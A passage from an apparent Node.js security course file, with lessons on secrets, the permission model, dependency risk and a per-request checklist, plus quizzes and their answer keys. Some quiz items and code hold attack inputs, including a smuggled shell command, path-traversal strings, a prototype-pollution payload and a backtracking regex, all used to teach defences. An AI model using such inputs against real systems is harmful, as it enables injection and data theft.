            "What does the most expensive request this endpoint will accept look like, and is that cost bounded by anything but the client's patience?",
            "Is the user authenticated?",
            "Is the route rate limited?",
          ],
          correctIndex: 1,
          explanation:
            "Password hashing, ReDoS, unbounded queries and zip bombs are all the same asymmetry: the client spends a little and you spend a lot.",
        },
      ],
    },
    {
      id: "secrets-and-permissions",
      title: "Secrets and Node's permission model",
      durationMinutes: 11,
      explanation:
        "## Secrets\n\n```text\nDATABASE_URL · JWT_SECRET · API_KEY · STRIPE_SECRET_KEY · PRIVATE_KEY\n```\n\nNever commit `.env`.\n\n> The part people underestimate is what \"committed\" means. Deleting the file in a later commit removes it from the working tree and <b>not from history</b>, so anyone who can clone the repository can read it, and if the repository was ever public then automated scanners found it within minutes. So the response to a committed secret is not to remove the file, it is to <b>rotate the secret</b>. Treat it as disclosed, because it was.\n\n```text\nDevelopment  .env (git-ignored) → local environment\nProduction   secret manager → runtime environment → Node\n```\n\n---\n\n## Practical habits\n\n> Validate secrets at startup with a schema, as Day 16 suggested: `envSchema.parse(process.env)` with `parse` rather than `safeParse`, so a missing `DATABASE_URL` is a dead process at deploy time rather than a 500 on the first request.\n>\n> And keep secrets out of logs. A `DATABASE_URL` contains a password, so logging a connection object or a whole config on startup publishes it to wherever your logs go, which is usually a third-party service with a broader access list than your secret manager.\n\n---\n\n## Node's permission model\n\n<b>Least privilege</b> (granting a program only the capabilities it actually needs).\n\n```bash\nnode --permission --allow-fs-read=./data app.js\n```\n\nVerified on Node 24.14.1. With `--permission` and only a narrow read grant:\n\n```text\nreadFileSync(\"./package.json\")   →  OK\nreadFileSync(\"~/.ssh/known_hosts\")  →  ERR_ACCESS_DENIED\nexecSync(\"echo hi\")              →  ERR_ACCESS_DENIED\n```\n\nSo a dependency that tries to read your keys or spawn a process is stopped, which is the real benefit.\n\n---\n\n## The flags that exist, and one that does not\n\nVerified from `node --help` on 24.14.1:\n\n```text\n--permission            --allow-fs-read=…\n--allow-fs-write=…      --allow-child-process\n--allow-worker          --allow-addons\n--allow-wasi            --allow-inspector\n```\n\n> There is <b>no `--allow-net`</b>. Verified: `node --permission --allow-net -e 1` fails with `node: bad option: --allow-net`. The older `--experimental-permission` is also gone, renamed to `--permission`.\n>\n> And the consequence is the important part. <b>The permission model does not restrict network access at all.</b> Verified: with `--permission` and a single narrow fs-read grant, `fetch(\"https://example.com\")` returned <b>200</b>.\n>\n> So the model stops a malicious dependency reading your SSH keys, and does <b>not</b> stop it opening a connection to anywhere. Since exfiltration is the point of reading the keys, this is a real boundary with a real hole in it, and the mitigation is at the network layer: egress rules in your infrastructure, not a Node flag.\n\n---\n\n## How to think about it\n\n> Useful, and not a substitute for anything. It is one boundary that happens to sit inside your process, which nothing else on this day does, and it is genuinely good at the filesystem and child-process cases. Grant narrowly, expect to discover a dependency that legitimately needs more than you thought, and do not describe it to anyone as sandboxing.",
      diagram: `"Committed" is worse than it sounds

    deleting the file in a later commit removes
    it from the WORKING TREE, not from HISTORY.

    anyone who can clone can read it.
    if the repo was ever public, automated
    scanners found it within MINUTES.

    → the response is NOT to remove the file.
      it is to ROTATE THE SECRET.

      treat it as disclosed, because it was.

    dev   .env (git-ignored) → local env
    prod  secret manager → runtime env → Node


Two habits

    VALIDATE AT STARTUP with a schema (Day 16)

      envSchema.parse(process.env)
                ^^^^^ parse, not safeParse

      a missing DATABASE_URL becomes a dead
      process at DEPLOY time, not a 500 on the
      first request

    KEEP SECRETS OUT OF LOGS

      a DATABASE_URL contains a PASSWORD

      logging a connection object or a whole
      config on startup publishes it to wherever
      your logs go

      which is usually a third-party service with
      a BROADER access list than your secret
      manager


The permission model, verified on 24.14.1

    node --permission --allow-fs-read=./data app.js

    readFileSync("./package.json")     OK
    readFileSync("~/.ssh/known_hosts") ERR_ACCESS_DENIED
    execSync("echo hi")                ERR_ACCESS_DENIED

    → a dependency that tries to read your keys
      or spawn a process is STOPPED.
      that is the real benefit.


⚠⚠ The flags that exist, and one that does not

    --permission
    --allow-fs-read=…      --allow-fs-write=…
    --allow-child-process  --allow-worker
    --allow-addons         --allow-wasi
    --allow-inspector

    THERE IS NO --allow-net.

      node --permission --allow-net -e 1
        →  node: bad option: --allow-net

    and --experimental-permission is gone too,
    renamed to --permission.


⚠⚠ And the consequence

    THE PERMISSION MODEL DOES NOT RESTRICT
    NETWORK ACCESS AT ALL.

    verified: with --permission and one narrow
    fs-read grant,

      fetch("https://example.com")  →  200

    so it stops a malicious dependency reading
    your SSH keys, and does NOT stop it opening a
    connection to anywhere.

    since EXFILTRATION IS THE POINT of reading
    the keys, this is a real boundary with a real
    hole in it.

    the mitigation is at the NETWORK layer:
    egress rules in your infrastructure, not a
    Node flag.


How to think about it

    useful, and not a substitute for anything.

    one boundary that happens to sit INSIDE your
    process, which nothing else today does, and
    genuinely good at the filesystem and
    child-process cases.

    grant narrowly.
    expect to find a dependency that legitimately
    needs more than you thought.
    do not describe it to anyone as SANDBOXING.`,
      codeExample: {
        title: "Secrets validated at startup, and the permission model's real shape",
        code: `// ── Validate secrets before the server starts ───────────────
// config.js
import { z } from "zod";

const envSchema = z.object({
  NODE_ENV: z.enum(["development", "test", "production"]),
  PORT: z.coerce.number().int().positive().default(3000),
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  //                     ^^^^^^^ a short signing secret is a
  //                     brute-forceable one, so make the
  //                     length a rule rather than a hope
  REDIS_URL: z.string().url(),
  ALLOWED_ORIGINS: z.string().transform((s) => s.split(",")),
});

export const env = envSchema.parse(process.env);
//                          ^^^^^ parse, not safeParse.
//
// Day 16's rule: this is the one place you WANT a throw. A
// missing DATABASE_URL should kill the process at deploy time
// with a readable message, not produce a server that boots,
// passes its health check and fails on the first real request.


// ── ⚠ Keep them out of your logs ────────────────────────────
// ✗ app.log.info({ config: env }, "starting");
//   Your DATABASE_URL contains a password, and it has just
//   been shipped to whichever log service you use, where the
//   access list is usually much broader than the one on your
//   secret manager.

// ✓ Log what you need, redacted.
app.log.info({
  nodeEnv: env.NODE_ENV,
  port: env.PORT,
  database: new URL(env.DATABASE_URL).host,     // host only
}, "starting");

// And configure the logger to redact, so a stray log call
// somewhere else cannot leak one either.
const app = Fastify({
  logger: {
    redact: {
      paths: [
        "req.headers.authorization",
        "req.headers.cookie",
        "req.body.password",
        "req.body.token",
        "*.passwordHash",
      ],
      censor: "[redacted]",
    },
  },
});
// Note req.headers.authorization: without this, every
// request log line contains a working bearer token.


// ── ⚠ If a secret was committed ─────────────────────────────
// git rm --cached .env && git commit
//
// That removes it from the working tree. The blob is still in
// history, still in every clone, still in every fork, and
// still in whatever caches your host keeps.
//
// The response is:
//   1. Rotate the secret. Now. This is the actual fix.
//   2. Then clean history if you want to, knowing it does
//      not un-disclose anything.
//   3. Add it to .gitignore so it cannot happen again.
//
// If the repository was ever public, assume the secret was
// harvested within minutes, because automated scanners watch
// the public event stream for exactly this.


// ═══════════════════════════════════════════════════════════
// Node's permission model, verified
// ═══════════════════════════════════════════════════════════

// $ node --permission --allow-fs-read=./package.json app.mjs
//
import { readFileSync } from "node:fs";
import { execSync } from "node:child_process";

process.permission.has("fs.read");            // true

readFileSync("./package.json");
// OK                                          ← verified

readFileSync(process.env.HOME + "/.ssh/known_hosts");
// Error: ... code: 'ERR_ACCESS_DENIED'        ← verified

execSync("echo hi");
// Error: ... code: 'ERR_ACCESS_DENIED'        ← verified
//
// A dependency that tries to read your keys or spawn a
// process is stopped, without you having reviewed the
// dependency. That is a genuinely useful boundary, and it is
// the only one on this day that sits inside your process.


// ── ⚠⚠ And the hole ────────────────────────────────────────
const res = await fetch("https://example.com");
console.log(res.status);
// 200                                         ← VERIFIED
//
// With --permission active and a single narrow fs-read grant.
//
// There is no --allow-net:
//
//   $ node --permission --allow-net -e 1
//   node: bad option: --allow-net             ← verified
//
// Nor the old flag name:
//
//   $ node --experimental-permission -e 1
//   node: bad option: --experimental-permission  ← verified
//
// So the model restricts the filesystem, child processes,
// workers, addons, WASI and the inspector, and does NOT
// restrict the network at all.
//
// Think about what that means for the threat it is usually
// described as defending against. A malicious postinstall
// script cannot read ~/.ssh, and it CAN:
//
//   · read anything you did grant, and POST it anywhere
//   · connect to your internal services, since it is inside
//     your network
//   · reach your cloud metadata endpoint
//
// The permission model closed the reading half. The
// exfiltration half is a network problem, and the control is
// an egress policy in your infrastructure, not a Node flag.


// ── ✓ Using it well ─────────────────────────────────────────
// package.json
//   "start": "node --permission --allow-fs-read=./ --allow-fs-write=./tmp --allow-net server.js"
//                                                                          ^^^^^^^^^^^^ ✗ will not start
//
// Correct:
//   "start": "node --permission --allow-fs-read=./ --allow-fs-write=./tmp server.js"
//
// Start permissive, then narrow while watching for
// ERR_ACCESS_DENIED:
//
//   --allow-fs-read=./dist,./node_modules,./package.json
//   --allow-fs-write=./tmp
//
// Expect surprises. A logger writing to a file, a library
// reading a CA bundle from /etc/ssl, an ORM reading a
// migrations directory: all legitimate, all denied until you
// grant them. That discovery is part of the value, because
// now you know what your process actually touches.
//
// And pair it with the boundary that does cover the network:
//   a container with no outbound access except your database
//   and the two APIs you actually call.`,
      },
      keyTakeaways: [
        "A committed secret stays in history, in every clone and fork. The fix is to rotate it, not to delete the file.",
        "If the repository was ever public, assume the secret was harvested within minutes by automated scanners.",
        "Validate secrets at startup with `parse`, not `safeParse`, so a missing value kills the process at deploy time rather than failing the first request.",
        "Make the signing secret's minimum length a schema rule, since a short one is brute-forceable.",
        "Keep secrets out of logs. A `DATABASE_URL` contains a password, and logs usually have a broader access list than your secret manager.",
        "Configure logger redaction for `authorization`, `cookie` and password fields, or every request line carries a working token.",
        "Verified on Node 24.14.1: with `--permission` and a narrow grant, reading `~/.ssh` and `execSync` both fail with `ERR_ACCESS_DENIED`.",
        "Verified: there is no `--allow-net`. The flag fails with `node: bad option`, and `--experimental-permission` is gone too.",
        "Verified and important: the permission model does not restrict the network. `fetch(\"https://example.com\")` returned 200 under `--permission`.",
        "So it closes the reading half of a dependency attack and leaves exfiltration open, which is the point of the reading.",
        "The network control is an egress policy in your infrastructure, not a Node flag.",
        "Start permissive, narrow while watching for `ERR_ACCESS_DENIED`, and expect legitimate surprises. That discovery is part of the value.",
        "It is one boundary inside your process, which nothing else today is, and it is not sandboxing.",
      ],
      commonMistakes: [
        "Deleting a committed `.env` and considering it handled. The secret is disclosed; rotate it.",
        "Using `safeParse` for environment variables, so the process boots half-configured and fails later.",
        "Logging the whole config or a connection object at startup, which publishes the database password.",
        "No logger redaction, so every request log line contains a usable bearer token.",
        "Expecting `--allow-net` to exist. It does not, and neither does `--experimental-permission`.",
        "Believing the permission model contains a malicious dependency. It cannot stop the network, which is where exfiltration happens.",
        "Describing the permission model as a sandbox, which sets an expectation it does not meet.",
        "Granting `--allow-fs-read=/` because narrowing was inconvenient, which leaves nothing restricted.",
        "Never trying it at all, and so never learning which directories your process actually touches.",
      ],
      quiz: [
        {
          question: "You committed `.env` and removed it in the next commit. What is the fix?",
          options: [
            "Nothing more, it is gone",
            "Rotate the secret. It remains in history, in every clone and fork, and public-repo scanners find it within minutes.",
            "Rewrite history and stop there",
            "Add it to `.gitignore`",
          ],
          correctIndex: 1,
          explanation:
            "Cleaning history is optional tidiness. Treating the secret as disclosed is the actual response.",
        },
        {
          question: "Which of these flags does not exist on Node 24?",
          options: [
            "`--allow-fs-read`",
            "`--allow-net`",
            "`--allow-child-process`",
            "`--allow-worker`",
          ],
          correctIndex: 1,
          explanation:
            "Verified: `node --permission --allow-net -e 1` fails with `node: bad option: --allow-net`. `--experimental-permission` is also gone.",
        },
        {
          question: "What did `fetch(\"https://example.com\")` return under `--permission` with only a narrow fs-read grant?",
          options: [
            "`ERR_ACCESS_DENIED`",
            "200. The permission model does not restrict the network at all.",
            "A timeout",
            "A warning and then 200",
          ],
          correctIndex: 1,
          explanation:
            "So it closes the reading half of a dependency attack and leaves exfiltration open, which is the point of the reading.",
        },
        {
          question: "What does the permission model actually protect against?",
          options: [
            "Everything a malicious dependency might do",
            "A dependency reading files you did not grant, or spawning a process. Verified: both returned `ERR_ACCESS_DENIED`.",
            "Network exfiltration",
            "Prototype pollution",
          ],
          correctIndex: 1,
          explanation:
            "Genuinely useful, and one boundary rather than a sandbox. The network needs an egress policy in your infrastructure.",
        },
        {
          question: "Why validate environment variables with `parse` rather than `safeParse`?",
          options: [
            "It is faster",
            "You want the process to die at deploy time with a readable message rather than boot half-configured and fail on the first real request",
            "`safeParse` does not work on `process.env`",
            "To get better types",
          ],
          correctIndex: 1,
          explanation:
            "Day 16's rule about where a throw is the desired outcome, applied to configuration.",
        },
      ],
    },
    {
      id: "dependencies-and-the-checklist",
      title: "Dependencies, and the request checklist",
      durationMinutes: 11,
      explanation:
        "## Your dependencies are your code\n\n```text\nnode_modules → hundreds or thousands of packages\n```\n\nA vulnerable one can compromise your application, and it runs with all the privileges your process has.\n\n```bash\nnpm audit\n```\n\n> Two honest things about `npm audit`. It reports a lot of findings that are <b>not reachable</b> from your application, typically in a build tool's transitive dependency, which is why people learn to ignore it. And `npm audit fix` can change a major version, so running it and pushing without reading the diff is a different kind of risk.\n>\n> Better: run it in CI so a new advisory is visible, and read what changed before you accept a fix. Day 12's lockfile point matters here too: `npm ci` installs exactly what the lockfile says, so a build is reproducible and a dependency cannot change under you between test and deploy.\n\n---\n\n## The bigger risk is install-time\n\n> A published vulnerability is a slow problem you can schedule. A <b>compromised</b> package is a fast one, and it does not need your application to run at all: a `postinstall` script executes on `npm install`, on your laptop and in CI, with your environment variables and your credentials in reach.\n>\n> That is why `npm ci --ignore-scripts` in CI is worth knowing about, and why the permission model from the last lesson is less help than it sounds here, since it does not restrict the network.\n>\n> Practical habits: pin versions with a lockfile and commit it, be suspicious of a brand-new package with few downloads, prefer fewer dependencies for small jobs, and be aware that a package name one character from a popular one is a known attack.\n\n---\n\n## The pipeline\n\n```text\npush → install → lint → type-check → test → dependency scan → build\n```\n\nDay 14's tooling and Day 13's tests, with one more gate.\n\n---\n\n## The checklist for every request\n\nThis is the day in one shape:\n\n```text\nrate limiting     is this client asking too often?\nbody limit        is this request too big?\nauthentication    who is this?\nauthorization     may they do this kind of thing?\nvalidation        is the input the right shape and size?\nresource check    is this specific record theirs?\nbusiness logic\ndata access       ownership in the query\nresponse schema   does only the declared data leave?\n```\n\n> Notice the order is not decorative. Rate limiting and body limits come <b>first</b> because they are the cheapest checks and reject the most requests. Authentication precedes authorization because you cannot decide permissions for someone you have not identified. And the resource check comes <b>after</b> validation, because you need a parsed integer id before you can ask whose record it is.\n\n---\n\n## The one thing to remember\n\n> Most of this day is a list, and one item on it accounts for more real breaches than the rest combined. Day 18 said it and it is worth ending on: <b>never confuse \"the user is logged in\" with \"the user may see this particular record\"</b>.\n>\n> Everything else here, CORS, headers, `npm audit`, limits, is worth doing and none of it will save you from a missing `AND user_id = $2`. The ownership predicate is the load-bearing line.",
      diagram: `Your dependencies are your code

    node_modules → hundreds or thousands

    and they run with ALL the privileges your
    process has.


⚠ Two honest things about npm audit

    it reports plenty that is NOT REACHABLE from
    your application, usually in a build tool's
    transitive dependency
      → which is why people learn to ignore it

    npm audit fix can change a MAJOR VERSION
      → running it and pushing without reading
        the diff is a different kind of risk

    better:
      run it in CI so a new advisory is VISIBLE
      read what changed before accepting a fix

    and Day 12's lockfile point:
      npm ci installs exactly what the lockfile
      says, so a dependency cannot change under
      you between test and deploy


⚠ The bigger risk is INSTALL-TIME

    a PUBLISHED vulnerability is a slow problem
    you can schedule.

    a COMPROMISED package is a fast one, and it
    does not need your application to run at all:

      a postinstall script executes on
      npm install

      on your laptop AND in CI

      with your environment variables and your
      credentials in reach

    → npm ci --ignore-scripts in CI is worth
      knowing about

    → and the permission model is less help than
      it sounds here, because it does not
      restrict the NETWORK

    habits:
      pin with a lockfile and commit it
      be suspicious of a brand-new package with
        few downloads
      prefer fewer dependencies for small jobs
      a package name ONE CHARACTER from a popular
        one is a known attack


The pipeline

    push → install → lint → type-check → test
         → dependency scan → build

    Day 14's tooling, Day 13's tests, one more
    gate.


THE CHECKLIST FOR EVERY REQUEST

    rate limiting    asking too often?
    body limit       too big?
    authentication   who is this?
    authorization    may they do this KIND of
                     thing?
    validation       right shape and size?
    resource check   is THIS RECORD theirs?
    business logic
    data access      ownership IN THE QUERY
    response schema  does only declared data
                     leave?

    ⚠ the order is not decorative:

      limits FIRST, because they are the cheapest
      checks and reject the most requests

      authentication before authorization,
      because you cannot decide permissions for
      someone you have not identified

      the resource check AFTER validation,
      because you need a parsed integer id before
      you can ask whose record it is


The one thing to remember

    most of this day is a list.

    ONE ITEM accounts for more real breaches than
    the rest combined:

      NEVER CONFUSE
        "the user is logged in"
      WITH
        "the user may see THIS PARTICULAR RECORD"

    CORS, headers, npm audit, limits: all worth
    doing, and none of them will save you from a
    missing

      AND user_id = $2

    the ownership predicate is the load-bearing
    line.`,
      codeExample: {
        title: "The pipeline, and the checklist as one route",
        code: `# ── CI, with the gates in a useful order ───────────────────
# .github/workflows/ci.yml
name: ci
on: [push, pull_request]

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 24
          cache: npm

      # npm ci, not npm install. Day 12: exactly what the
      # lockfile says, so the build is reproducible and a
      # dependency cannot change between test and deploy.
      - run: npm ci

      - run: npx tsc --noEmit
      - run: npx eslint .
      - run: node --test

      # Fails the build on a high or critical advisory, and
      # stays quiet about the low-severity noise in build
      # tooling that teaches people to ignore this step.
      - run: npm audit --audit-level=high

      - run: npm run build


# ── ⚠ The install-time risk, which audit does not cover ─────
# npm ci --ignore-scripts
#
# A postinstall script runs on install, before any of your
# code, with your environment in reach. In CI that includes
# your deploy credentials.
#
# --ignore-scripts breaks packages that legitimately build a
# native addon, so it is a decision rather than a default.
# Know it exists and know what you are trading.


// ── The checklist, as one route ─────────────────────────────
app.register(async (api) => {
  // 1. Rate limiting. First, because it is the cheapest
  //    check and rejects the most requests.
  await api.register(rateLimit, {
    max: 100, timeWindow: "1 minute", redis,
    keyGenerator: (request) => request.user?.id ?? request.ip,
  });

  // 3. Authentication, scoped to this subtree so a new route
  //    here is protected by where it sits.
  api.addHook("preHandler", authenticate);

  api.get("/invoices/:id", {
    // 2. Body and payload limits.
    bodyLimit: 16 * 1024,

    // 4. Authorization: may they do this KIND of thing?
    preHandler: api.requirePermission("invoices.read"),

    schema: {
      // 5. Validation. Shape AND size, both.
      params: z.object({ id: z.coerce.number().int().positive() }),
      querystring: z.object({
        include: z.enum(["lines", "payments"]).optional(),
      }),
      // 9. Response schema: only declared fields leave.
      response: {
        200: invoiceResponseSchema,
        404: errorSchema,
      },
    },
  }, async (request, reply) => {
    // 6 + 8. The resource check, in the query. The one line
    // on this whole list that carries the most weight.
    const [invoice] = await db
      .select()
      .from(invoices)
      .where(and(
        eq(invoices.id, request.params.id),
        eq(invoices.userId, request.user.id),
      ));

    // 404, not 403, so we do not confirm which ids exist.
    if (!invoice) return reply.code(404).send({ error: "Not found" });

    // 7. Business logic.
    return withComputedTotals(invoice);
  });
});


// ── And the tests that hold the whole day together ──────────
// Three property tests, each catching a class rather than a
// case. Each is worth more than a dozen happy-path tests.

test("no route answers 200 without credentials", async (t) => {
  // From the RBAC lesson: walks every registered route.
  // Fails the moment someone adds an unprotected one.
});

test("a user cannot read another user's invoice", async (t) => {
  // From the IDOR lesson: two users, one cross-read, assert
  // 404. Catches the single most common serious bug, and the
  // 404 assertion also enforces no id enumeration.
});

test("GET /invoices/:id never returns internal fields", async (t) => {
  const res = await app.inject({
    url: "/invoices/1",
    headers: { authorization: \`Bearer \${token}\` },
  });
  assert.deepEqual(
    Object.keys(res.json()).sort(),
    ["currency", "id", "lines", "status", "total"],
  );
  // Day 16: asserting the EXACT key set fails when a field is
  // added, which is exactly when you want to be asked whether
  // it should be public.
});


// ── The day, compressed ─────────────────────────────────────
//   rate limit      caps the input
//   body limit      caps the allocation
//   authentication  who
//   authorization   what kind
//   validation      shape and size
//   resource check  WHICH RECORD          ← this one
//   response schema what leaves
//
// Everything above the marked line is worth doing and cannot
// save you from a missing ownership predicate. CORS is a
// browser feature. Headers are browser instructions. npm
// audit is a schedule. The predicate is the control.`,
      },
      keyTakeaways: [
        "Dependencies run with every privilege your process has, so they are part of your code.",
        "`npm audit` reports findings that are often unreachable from your application, which is why people learn to ignore it. Run it in CI at `--audit-level=high`.",
        "`npm audit fix` can change a major version, so reading the diff matters more than running the command.",
        "`npm ci` installs exactly what the lockfile says, so a dependency cannot change between test and deploy.",
        "The larger risk is install-time: a `postinstall` script runs on `npm install`, on your laptop and in CI, with your credentials in reach.",
        "`npm ci --ignore-scripts` addresses that and breaks packages that legitimately build native addons, so it is a trade rather than a default.",
        "The permission model is little help against that, because the previous lesson verified it does not restrict the network.",
        "The request checklist order is not decorative: limits first because they are cheapest, authentication before authorization, and the resource check after validation.",
        "One item accounts for more real breaches than the rest combined: never confuse being logged in with being allowed to see this record.",
        "Three property tests hold the day together: every route requires credentials, a user cannot read another's record, and a response has an exact key set.",
        "CORS is a browser feature, headers are browser instructions, and `npm audit` is a schedule. The ownership predicate is the control.",
      ],
      commonMistakes: [
        "Using `npm install` in CI instead of `npm ci`, so the build is not reproducible.",
        "Running `npm audit fix` and pushing without reading what changed, including major version bumps.",
        "Dismissing `npm audit` entirely because most findings are unreachable, rather than gating on high and critical.",
        "Ignoring install-time risk, which is the fast attack and does not need your application to run.",
        "Assuming the permission model contains a malicious dependency. It does not restrict the network.",
        "Adding a dependency with few downloads and a name one character from a popular package.",
        "Putting authentication before rate limiting, so an unauthenticated flood still costs you the expensive work.",
        "Doing the resource check before validation, so the id is still an unparsed string.",
        "Treating a clean security scan as evidence of security when no ownership predicate exists anywhere.",
        "Writing many happy-path tests and none of the three property tests that catch whole classes.",
      ],
      quiz: [
        {
          question: "Why do rate limiting and body limits come first in the checklist?",
          options: [
            "Convention",
            "They are the cheapest checks and reject the most requests, so putting them after authentication means paying for expensive work on requests you will refuse",
            "Fastify requires that order",
            "They need the user id",
          ],
          correctIndex: 1,
          explanation:
            "Day 18's asymmetry: the attacker pays nothing to send the request, so reject it as early as you can.",
        },
        {
          question: "Why must the resource check come after validation?",
          options: [
            "For better errors",
            "You need a parsed, bounded id before you can ask whose record it is",
            "Validation is slower",
            "It does not matter",
          ],
          correctIndex: 1,
          explanation:
            "Day 15 verified params arrive as strings, so the ownership query needs the coerced value.",
        },
        {
          question: "What is the honest problem with `npm audit`?",
          options: [
            "It misses everything",
            "Many findings are not reachable from your application, which teaches people to ignore it, and `npm audit fix` can change a major version",
            "It is too slow for CI",
            "It requires a paid plan",
          ],
          correctIndex: 1,
          explanation:
            "Gate CI on high and critical, and read what a fix changed before accepting it.",
        },
        {
          question: "Why is a compromised package worse than a published vulnerability?",
          options: [
            "It affects more packages",
            "A `postinstall` script runs on `npm install`, before any of your code, on your laptop and in CI, with your credentials in reach",
            "It cannot be detected",
            "It bypasses TypeScript",
          ],
          correctIndex: 1,
          explanation:
            "A published advisory is a slow problem you can schedule. This one does not need your application to run at all.",
        },
        {
          question: "If you remember one thing from this day, what is it?",
          options: [
            "Configure CORS strictly",
            "Never confuse \"the user is logged in\" with \"the user may see this particular record\"",
            "Always run `npm audit`",
            "Set every security header",
          ],
          correctIndex: 1,
          explanation:
            "Everything else here is worth doing and none of it saves you from a missing `AND user_id = $2`.",
        },
      ],
    },
  ],
  finalQuiz: [
    {
      question: "A route has an authentication hook and a permission check for `posts.delete`, then deletes by id. What is still missing?",
      options: [
        "Nothing",
        "Which post. The permission says the user may delete some post; it says nothing about whether this one is theirs.",
        "A response schema",
        "Rate limiting",
      ],
      correctIndex: 1,
      explanation:
        "Authentication happens once and authorization has to happen per resource. Put the ownership predicate in the `WHERE` clause.",
    },
    {
      question: "Why return 404 rather than 403 for a record that is not yours?",
      options: [
        "403 is deprecated",
        "403 confirms it exists, so iterating ids reveals exactly which ones do, which is often the valuable information",
        "404 is faster",
        "Clients handle 404 better",
      ],
      correctIndex: 1,
      explanation:
        "Use 403 only when the caller reached the row through their own scope and already knows it exists.",
    },
    {
      question: "What is the real problem with accumulating nine roles?",
      options: [
        "Performance",
        "Their meaning lives in scattered `if` statements, so adding a role is easy and auditing who can delete a user is not",
        "Roles cannot nest",
        "Nine exceeds the RBAC model",
      ],
      correctIndex: 1,
      explanation:
        "Permission checks couple a route to the action it performs instead of to an org chart, so a one-off grant is a table row.",
    },
    {
      question: "What was verified about a request with no `Origin` header against a strict CORS allowlist?",
      options: [
        "It was rejected",
        "It returned 200 with the full body, because CORS is browser-enforced and there was no browser",
        "It got a 403",
        "It triggered a preflight",
      ],
      correctIndex: 1,
      explanation:
        "CORS protects your users' other tabs from reading your API with their cookies. It does not protect your API.",
    },
    {
      question: "Why is `origin: true` worse than `origin: \"*\"` with credentials enabled?",
      options: [
        "It is slower",
        "The wildcard is rejected by the browser so it fails safe; reflection returns a valid credentialed response for every origin, so it works for the attacker",
        "They are the same",
        "It breaks preflight",
      ],
      correctIndex: 1,
      explanation:
        "Verified that `https://evil.example` was reflected with `allow-credentials: true`. It is common because it makes the console error go away.",
    },
    {
      question: "What is Helmet's default CSP, and what does it do to a typical app?",
      options: [
        "CSP is off by default",
        "`default-src 'self'`, which blocks CDN scripts, external fonts and inline scripts, breaking the page with the error only in the browser console",
        "It is permissive",
        "It only applies to HTML",
      ],
      correctIndex: 1,
      explanation:
        "Verified as shipped. The usual reaction is to disable CSP, which discards the most valuable header on the list.",
    },
    {
      question: "Why change Helmet's default HSTS before deploying?",
      options: [
        "It is too short",
        "It is a year with `includeSubDomains`, and a browser that receives it refuses plain HTTP for that long with no remote undo, so an HTTP-only subdomain becomes unreachable",
        "It conflicts with CSP",
        "It needs HTTP/2",
      ],
      correctIndex: 1,
      explanation:
        "Verified `max-age=31536000; includeSubDomains`. Start short, confirm every subdomain, then extend.",
    },
    {
      question: "What was verified about `exec` versus `execFile` with `\"hostname; echo INJECTED\"`?",
      options: [
        "Both interpreted the semicolon",
        "`exec` ran two commands; `execFile` passed the whole string as one argument and interpreted nothing",
        "Both treated it literally",
        "`execFile` threw",
      ],
      correctIndex: 1,
      explanation:
        "`exec` runs a shell. And `execFile(..., { shell: true })` restores the injection, which Node 24 warns about with `DEP0190`.",
    },
    {
      question: "Why does `resolved.startsWith(UPLOADS)` fail as a path containment check?",
      options: [
        "It is case-sensitive",
        "A sibling whose name begins with the same characters passes it. Verified: `/var/app/uploads-evil/secret.txt` starts with `/var/app/uploads`.",
        "`startsWith` is slow",
        "It only fails on Windows",
      ],
      correctIndex: 1,
      explanation:
        "Compare against `UPLOADS + path.sep`, or use `path.relative` and reject a leading `..`. Both verified.",
    },
    {
      question: "What did `path.resolve(\"/var/app/uploads\", \"/etc/passwd\")` return?",
      options: [
        "`/var/app/uploads/etc/passwd`",
        "`/etc/passwd`, because `resolve` discards the base when the second argument is absolute",
        "An error",
        "`/var/etc/passwd`",
      ],
      correctIndex: 1,
      explanation:
        "`path.join` stayed inside for that input, so resolve alone is worse than join and only resolve plus containment is safe.",
    },
    {
      question: "What was verified about `JSON.parse('{\"__proto__\":{\"isAdmin\":true}}')`?",
      options: [
        "It pollutes immediately",
        "It creates an ordinary own property and pollutes nothing. A later recursive merge is what sets it on `Object.prototype`.",
        "It throws",
        "It drops the key",
      ],
      correctIndex: 1,
      explanation:
        "Verified `({}).isAdmin` was `undefined` after the parse and `true` after a naive merge. Fear the merge, not the parser.",
    },
    {
      question: "Why is prototype pollution hard to debug?",
      options: [
        "It only happens in production",
        "An inherited property does not serialise, so `JSON.stringify` shows a correct-looking object while `user.isAdmin` is `true`",
        "There is no stack trace",
        "It needs a debugger",
      ],
      correctIndex: 1,
      explanation:
        "Verified both. The bug is invisible in exactly the tool you would reach for, and it makes every `if (user.isAdmin)` pass.",
    },
    {
      question: "What did `/^(a+)+$/` measure at 30 characters, and what happened to the event loop?",
      options: [
        "About 30ms with no effect",
        "6534ms, and during a 7176ms match the event loop ticked 0 times, so the whole process served nothing",
        "It threw",
        "It returned instantly",
      ],
      correctIndex: 1,
      explanation:
        "A 30-character body froze the server for seven seconds including the health check, and the attacker needed no account.",
    },
    {
      question: "What is Fastify's default `bodyLimit`, and where is the real risk?",
      options: [
        "Unlimited, so set one",
        "1MB returning 413, so the real risk is raising it globally for one upload route and letting every endpoint accept that size",
        "10MB, and it cannot be changed",
        "There is no default",
      ],
      correctIndex: 1,
      explanation:
        "Verified `FST_ERR_CTP_BODY_TOO_LARGE`. Set `bodyLimit` per route and keep the global default tight.",
    },
    {
      question: "Why does an upload size limit not stop a zip bomb?",
      options: [
        "Archives skip body limits",
        "The limit measured the compressed size, and the expanded size is what exhausts CPU, memory and disk",
        "Compression is undetectable",
        "It does stop it",
      ],
      correctIndex: 1,
      explanation:
        "Track expansion during decompression with both an absolute cap and a ratio cap, and abort mid-stream.",
    },
    {
      question: "Which permission-model flag does not exist on Node 24?",
      options: [
        "`--allow-fs-write`",
        "`--allow-net`",
        "`--allow-child-process`",
        "`--allow-worker`",
      ],
      correctIndex: 1,
      explanation:
        "Verified: `node --permission --allow-net -e 1` fails with `node: bad option`. `--experimental-permission` is also gone.",
    },
    {
      question: "Under `--permission` with only a narrow fs-read grant, what did `fetch(\"https://example.com\")` return?",
      options: [
        "`ERR_ACCESS_DENIED`",
        "200. The permission model does not restrict the network at all.",
        "A timeout",
        "A warning, then 200",
      ],
      correctIndex: 1,
      explanation:
        "So it stops a dependency reading your keys and not exfiltrating them, which is the point. Egress rules are the network control.",
    },
    {
      question: "You committed `.env` and deleted it in the next commit. What is the fix?",
      options: [
        "Nothing further",
        "Rotate the secret. It stays in history, in every clone and fork, and public-repo scanners find it within minutes.",
